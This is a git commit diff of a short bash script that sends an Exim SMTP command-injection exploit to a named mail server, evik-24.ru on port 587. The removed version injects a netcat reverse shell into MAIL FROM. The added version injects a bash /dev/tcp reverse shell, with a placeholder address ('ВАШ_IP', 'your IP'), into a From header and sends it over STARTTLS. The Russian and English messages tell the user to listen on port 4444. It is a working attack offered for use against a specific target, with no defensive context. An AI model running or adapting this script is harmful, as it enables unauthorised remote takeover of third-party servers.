c93b1bff3c052a8187f21328b053376b0bda2c2f
sergejpolovov8-debug <sergejpolovov8@gmail.com>
2025-08-05 14:47:19 +0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,12 +1,13 @@
 #!/bin/bash
-echo "Отправка эксплойта на evik-24.ru:587..."
+echo "Exploiting Exim at evik-24.ru:587..."
 (
   sleep 2; echo "HELO attacker.com"
-  sleep 1; echo "MAIL FROM: <'|nc -e /bin/sh 192.168.1.100 4444'>"
+  sleep 1; echo "MAIL FROM: <attacker@example.com>"
   sleep 1; echo "RCPT TO: <admin@evik-24.ru>"
   sleep 1; echo "DATA"
+  sleep 1; echo "From: |/bin/bash -c 'bash -i >& /dev/tcp/ВАШ_IP/4444 0>&1'"
   sleep 1; echo "Subject: RCE"
   sleep 1; echo "."
   sleep 1; echo "QUIT"
-) | telnet evik-24.ru 587
-echo "[+] Reverse-shell отправлен. Слушайте порт 4444."
+) | openssl s_client -connect evik-24.ru:587 -starttls smtp -quiet 2>/dev/null
+echo "[+] Эксплойт отправлен. Слушайте порт 4444."
